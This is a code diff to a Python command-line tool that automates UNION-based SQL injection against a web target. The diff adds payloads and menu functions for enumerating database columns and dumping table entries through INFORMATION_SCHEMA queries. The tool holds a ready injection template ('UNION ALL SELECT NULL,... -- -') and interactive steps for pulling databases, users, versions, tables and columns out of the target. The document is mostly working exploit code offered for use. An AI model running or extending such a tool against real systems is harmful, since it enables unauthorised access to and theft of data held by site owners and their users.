@@ -9,12 +9,16 @@ def get_sqli_info(payload):
 		{"data": "username","value":"", "payload":""},
 		{"data": "version","value":"", "payload":""},
         {"data": "tables","value":"", "payload":""},
+        {"data": "columns","value":"", "payload":""},
+        {"data": "entries","value":"", "payload":""}
 	]
     info = [
 		{"payload":"SCHEMA_NAME",	"source":"FROM INFORMATION_SCHEMA.SCHEMATA"}, #Databases
 		{"payload":"user()",		"source":""}, #User
 		{"payload":"@@version",		"source":""}, # DBMS Version
-        {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES"}
+        {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES"},
+        {"payload":"COLUMN_NAME",    "source": "FROM INFORMATION_SCHEMA.COLUMNS"},
+        {"payload":"CONCAT_WS(0x3a, column1, column2)",    "source": "FROM table_name"}, #Entries
 
 	]
     cont = 0
@@ -100,21 +104,16 @@ payload = {"id": "1"}
 sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
 
 #WORKING CODE
-"""
-response1 = post_request(url, payload, headers).text
-
-
-payload = string_to_json(sqli_payload)
-response2 = post_request(url, payload, headers).text # Payload OK
-
-aux_payloads = get_sqli_info(sqli_payload)
-database_payload = string_to_json(aux_payloads[0]['payload'])
-response3 = post_request(url, database_payload, headers).text
-result = html_diff(response1,response3)
-
-add_values_to_data_payload(result, aux_payloads[0])
-"""
 def show_tables_from_specific_database(sqli):
+    """
+    Show tables from specific database
+    
+    1) Show available databases
+    2) Choose database
+    3) Set payload to get tables from specific database
+    4) Get tables
+    5) Return sqli object with updated tables data
+    """
     #Get databases
     print("Available databases:")
     for db in sqli.data[0]['value']:
@@ -126,10 +125,27 @@ def show_tables_from_specific_database(sqli):
     #Set payload to get tables from specific database
     sqli.data[3]['payload'] = sqli.sqli_payload.replace("payload", "TABLE_NAME").replace("source", "FROM INFORMATION_SCHEMA.TABLES")
     sqli.data[3]['payload'] = sqli.data[3]['payload'].replace("INFORMATION_SCHEMA.TABLES", f"INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{option}'")
-    #Obtener tablas
+    #Get tables
     sqli.data[3] = get_dbms_data_values(sqli,3).data[3]
     return sqli
-    
+
+def show_columns_from_specific_table(sqli):
+    print("Available tables:")
+    if sqli.data[3]['value'] == "":
+        print("\033[31mNo tables data available. Please run 'Show tables from specific database' first.\033[0m")
+        return
+    for table in sqli.data[3]['value']:
+        print(f"\033[37m- {table}\033[0m")
+    #Choose table
+    option = str(input("Choose table:\t\033[0m"))
+    while option not in sqli.data[3]['value']:
+        option = str(input("Invalid table. Choose table:\t\033[0m"))
+    #Set payload to get columns from specific table
+    sqli.data[4]['payload'] = sqli.sqli_payload.replace("payload", "COLUMN_NAME").replace("source", "FROM INFORMATION_SCHEMA.COLUMNS")
+    sqli.data[4]['payload'] = sqli.data[4]['payload'].replace("INFORMATION_SCHEMA.COLUMNS", f"INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{option}'")
+    #Get columns
+    sqli.data[4] = get_dbms_data_values(sqli,4).data[4]
+    return sqli
 #------------
 def get_dbms_data_values(sqli, data_index=0):
     try:
@@ -166,6 +182,8 @@ def menu(option, sqli):
         sqli.data[2] = get_dbms_data_values(sqli,2).data[2]
     elif option == 30:
         sqli.data[3] = show_tables_from_specific_database(sqli).data[3]
+    elif option == 31:
+        sqli.data[4] = show_columns_from_specific_table(sqli).data[4]
     if result == 0:
         run(sqli)
 
@@ -193,7 +211,7 @@ def run(sqli):
     #print("21)\tGet User Name")
     #print("22)\tGet DBMS Version")
     print("30)\tShow tables from specific database")
-    print("31)\tShow columns from specific table (Not implemented)")
+    print("31)\tShow columns from specific table")
     print("\n0) Exit")
     
     option = int(input("Choose option:\t"))
